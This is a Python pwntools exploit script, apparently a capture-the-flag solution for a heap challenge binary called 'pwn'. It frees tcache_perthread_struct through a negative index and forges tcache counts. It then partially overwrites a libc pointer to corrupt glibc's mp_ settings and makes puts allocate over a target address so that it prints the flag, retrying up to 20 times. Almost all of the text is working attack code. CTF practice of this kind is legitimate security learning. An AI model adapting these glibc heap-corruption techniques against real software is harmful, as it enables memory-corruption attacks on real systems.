# _*_ coding:utf-8 _*_
#!/usr/bin/env python3 
from pwn import * 
context(os='linux', arch='amd64') 
context.log_level='debug' 
context.terminal = ["/usr/bin/tmux","sp","-h"]
def exp(): 
    io = process('./pwn', stdout=PIPE) 
    # io = remote('172.17.0.1', 9999) 
    def malloc(size, content): 
        io.sendlineafter(b'>', b'1') 
        io.sendline(str(int(size)).encode()) 
        io.send(content) 
    def tcache_count(l): 
        res = [b'\x00\x00' for i in range(64)] 
        for t in l: 
            res[(t - 0x20)//0x10] = b'\x08\x00' 
        return b''.join(res)
    try:
        malloc(0x1000, p64(0x404078)*(0x1000//8)) #填充target地址，free后合并进入topchunk
        io.sendlineafter(b'>', b'2') 
        io.sendline(b'-656') # free tcache_perthread_struct
        malloc(0x280, tcache_count([0x290]) + b'\n')   # 将tcache[0x290]填满，让tcache_perthread_struct可以free到unsortedbin，malloc tcache_perthread_struct and free,free to unsortedbin
        malloc(0x260, tcache_count([0x270]) + b'\n')   # 将tcache[0x270]填满，从unsortedbin申请 Leave libc address in tcache[0x400]
        malloc(0x280, tcache_count([0x400, 0x410, 0x290] ) + b'\x01\x00'*4*62 + b'\x90\xf2' + b'\n') # Modify the last 2 bytes of libc to mp_offset
        malloc(0x3f0, flat([ 0x20000, 0x8, 0,0x10000, 0, 0, 0, 0x1301000, 2**64-1, ]) + b'\n') # malloc mp_ and rewrite tcachebins to a bignumber
        io.sendlineafter(b'>', b'3') # The first initialization of puts will apply for memory and write the output content to the buffer (target)
        io.sendlineafter(b'>', b'3') # trigger
        flaaag = io.recvall(timeout=2) 
        print(flaaag) 
        io.close() 
        return True 
    except: 
        io.close() 
        return False 
i = 0 
while i < 20 and not exp(): 
    i += 1 
    continue
# exp()